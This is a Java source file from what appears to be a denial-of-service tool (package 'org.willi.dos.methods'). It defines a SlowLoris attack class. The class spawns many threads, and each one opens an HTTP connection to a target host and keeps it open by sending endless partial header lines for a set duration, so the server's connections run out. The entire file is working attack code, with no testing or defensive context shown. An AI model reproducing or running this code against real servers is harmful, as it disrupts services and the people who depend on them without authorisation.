/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package org.willi.dos.methods;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Random;
import org.willi.dos.useragent.UserAgent;
import org.willi.dos.methods.AttackMethod;
/**
 *
 * @author phamm
 */
public class SlowLoris extends AttackMethod
{
    private static String[] help = {};
    private static Random rand = new Random();
    
    public SlowLoris(String host, int threads, int duration)
    {
        super(host, threads, duration);
    }

    @Override
    public void startAttack()
    {
        String host = super.getHost();
        int duration = super.getDuration();
        for(int i = 0; i < super.getThreads(); i++)
        {
            String useragent = UserAgent.getUserAgent();
            new Thread(new Runnable()
            {
                @Override
                public void run()
                {
                    try
                  {
                        Socket socket = new Socket(host, 80);
                        PrintWriter out = new PrintWriter(socket.getOutputStream());
                        out.println("GET / HTTP/1.1");
                        out.println("Host: " + host);
                        out.println(useragent);
                        out.println("Content-Length: "+useragent.length());
                        long endtime = System.currentTimeMillis() + (duration * 1000);
                        while(System.currentTimeMillis() < endtime)
                        {
                            out.println("X-a: b");
                            out.flush();
                            Thread.sleep(1);
                        }
                        out.close();
                        socket.close();
                        
                    }
                    catch (IOException ex)
                    {
                        System.err.println("Cannot connect to " + host);
                    }
                    catch (InterruptedException ex)
                    {
                        
                    }
                }
            }).start();
}
    }
    
    
}
